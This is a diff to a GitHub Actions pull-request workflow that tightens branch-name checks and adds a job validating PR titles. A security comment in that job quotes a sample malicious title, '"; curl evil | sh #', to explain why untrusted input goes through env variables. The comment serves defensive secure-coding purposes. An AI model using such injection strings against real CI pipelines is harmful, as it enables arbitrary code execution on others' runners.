@@ -7,6 +7,9 @@ name: pr-checks
 on:
   pull_request:
     branches: [integration, main]
+    # `edited` so retitling a PR re-runs the title check below — the
+    # default type set doesn't include title-only edits.
+    types: [opened, edited, synchronize, reopened]
 
 permissions:
   contents: read
@@ -16,16 +19,21 @@ jobs:
     name: Branch naming convention
     runs-on: ubuntu-latest
     steps:
-      - name: Validate branch name
+      # Keep this regex in sync with scripts/check-branch-name.sh —
+      # duplicated here (rather than checking out and calling the
+      # script) because actions/checkout on a pull_request event
+      # leaves you on a detached-HEAD merge commit by default, and
+      # `git symbolic-ref` — what the local script keys on — returns
+      # empty there.
+      - name: Validate branch name (<type>/<JIRA-TICKET>-<username>)
         env:
           BRANCH: ${{ github.head_ref }}
         run: |
-          if [[ "$BRANCH" =~ ^(feature|bugfix|hotfix)/[A-Z]+-[0-9]+-[a-z0-9-]+$ ]] || \
-             [[ "$BRANCH" =~ ^ai/[a-z0-9-]+$ ]] || \
+          if [[ "$BRANCH" =~ ^(feature|bugfix|hotfix|ai)/[A-Z]+-[0-9]+-[a-z0-9][a-z0-9._-]*$ ]] || \
              [[ "$BRANCH" =~ ^experiment/[a-z0-9-]+$ ]]; then
             echo "✓ '$BRANCH' matches the naming convention"
           else
-            echo "✗ '$BRANCH' doesn't match feature|bugfix|hotfix/JIRA-desc, ai/desc, or experiment/topic" >&2
+            echo "✗ '$BRANCH' doesn't match <type>/<JIRA-TICKET>-<username> (feature|bugfix|hotfix|ai) or experiment/topic" >&2
             exit 1
           fi
 
@@ -37,6 +45,12 @@ jobs:
         with:
           fetch-depth: 0
       - name: Validate each commit message
+        env:
+          # actions/checkout leaves this job on a detached HEAD, so
+          # check-commit-msg.sh's own `git symbolic-ref` for the
+          # branch↔ticket cross-check would silently see nothing —
+          # pass the real branch explicitly instead.
+          PR_BRANCH: ${{ github.head_ref }}
         run: |
           set -e
           base="${{ github.event.pull_request.base.sha }}"
@@ -46,6 +60,30 @@ jobs:
             git log -1 --pretty=%B "$sha" > /tmp/msg.txt
             bash scripts/check-commit-msg.sh /tmp/msg.txt
           done
+
+  pr-title:
+    name: PR title (what squash-merge actually commits to main)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Validate PR title
+        # main is squash-only (Tab 3's Branch Protection table) — on
+        # squash-merge the PR TITLE becomes the commit subject on main,
+        # not any of the individual commits checked above. This title
+        # is what actually drives the semver bump and changelog entry.
+        #
+        # SECURITY: the title is untrusted user input. It's passed
+        # through `env:` and expanded as a shell VARIABLE ($PR_TITLE),
+        # never interpolated directly into the `run:` script via
+        # `${{ }}` — that would let a title like `"; curl evil | sh #`
+        # break out and execute arbitrary commands on the runner.
+        env:
+          PR_BRANCH: ${{ github.head_ref }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          SKIP_TRAILER_CHECKS: "1"
+        run: |
+          printf '%s\n' "$PR_TITLE" > /tmp/pr-title.txt
+          bash scripts/check-commit-msg.sh /tmp/pr-title.txt
 
   pre-commit:
     name: pre-commit (mirrors every local pre-commit hook)
